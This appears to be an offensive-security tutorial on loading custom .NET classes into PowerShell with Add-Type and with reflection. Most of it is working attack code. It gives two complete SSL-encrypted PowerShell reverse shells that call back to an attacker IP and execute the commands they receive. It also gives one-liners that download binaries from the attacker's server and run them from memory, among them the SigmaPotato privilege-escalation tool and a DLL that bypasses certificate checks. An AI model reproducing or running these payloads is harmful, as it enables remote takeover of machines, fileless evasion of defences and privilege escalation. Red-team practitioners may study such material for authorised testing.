
## Overview
---
.NET classes are fundamental building blocks in the Microsoft .NET Framework. Classes define properties, methods, and events, allowing developers to structure and organize code in a modular and reusable way.  With .NET being a cornerstone of Windows, the ability to load custom classes into PowerShell gives attackers near infinite possibilities in terms of capabilities. Nearly anything you can develop in C# in theory can be loaded into a PowerShell session if written correctly.

### Loading Custom .NET  Classes into PowerShell via Add-Type
---
PowerShell is neat because it allows us to write native C# code and load them into the current session with different types of tools, most common being `Add-Type`. My personal most common use for it is using custom code to effectively disable the server certificate check that `[System.Net.WebClient]` uses.  This allows for communication with a simple web server over HTTPS using self signed certificates instead of HTTP.

- For another example, below is an SSL encrypted PowerShell reverse shell payload using a custom .NET Class:

```powershell
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>

# Custom Self-Signed Certificate bypass .NET class
$SSC = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static SslStream Stream(TcpClient client)
    {
        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
# Load Bypass into PowerShell session
Add-Type $SSC

# Simple PowerShell reverse shell using encrypted stream
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = [SelfSignedCerts]::Stream($Client)
$Stream.AuthenticateAsClient("")
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```

### Loading Custom .NET Classes into PowerShell via Reflection
---
Another really neat method of loading powerful C# tomfoolery into session is via reflection -- specifically using `[System.Reflection.Assembly]::Load(<intended_assembly_here>)`. This method is especially powerful because you can load complete C# binaries into session. When combining this with `[System.Net.WebClient]`, you can even host C# binaries on your attacker and load them into a session remotely on a compromised host; a prime example of this would be exploiting `SeImpersonatePrivilege` for privilege escalation all from memory via a reflected tool.

- Below is an example of this using my custom **SigmaPotato** repository: [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/GodPotatoNet "https://github.com/tylerdotrar/SigmaPotato")

```powershell
# Load Remotely Hosted C# binary into PowerShell via Reflection
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)

# Load Remotely Hosted C# binary into PowerShell via Reflection (one-liner)
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/SigmaPotato.exe"))

# Execute binary entirely from memory
[SigmaPotato]::Main('<command>')
```

### Tying it all Together
---
Turns out `Add-Type` has the ability to compile really simple assemblies (e.g., `.dll` or `.exe`) instead of just loading them into session. Meaning instead of needing Visual Studio to compile a binary for something simple like a self-signed certificate bypass, we can...

1. Create a small `.dll` using `Add-Type`.
2. Host the `.dll` it on our attacker using a simple web server.
3. Load it into a PowerShell session it via `[System.Reflection.Assembly]`.
4. This achieves the same result without hardcoding the entire class in cleartext.

For this final example, I'll recreate the reverse shell payload from the first section, however instead of loading the `[SelfSignedCerts]` class into session via `Add-Type`, I've instead used `Add-Type $SSC -OutputAssembly SSC.dll` on my attacker to create an `SSC.dll` assembly from the original example code, and began hosting it on a simple web server on my attacker. Now for the reverse shell payload, instead of including the entire C# source code, we can replace that code snippet in our payload with an assembly reflection pointing to the hosted `SSC.dll`.

```powershell
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>

# Load remotely hosted self-signed certificate bypass C# binary
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/SSC.dll"))

# Simple PowerShell reverse shell using encrypted stream
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = [SelfSignedCerts]::Stream($Client)
$Stream.AuthenticateAsClient("")
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```

## Conclusion
---
All methods have pros and cons -- sometimes it's easier to just leave the code snippet in the payload and add it to session via `Add-Type` -- sometimes size is a concern, so we just want to point to it via reflection, etc etc etc.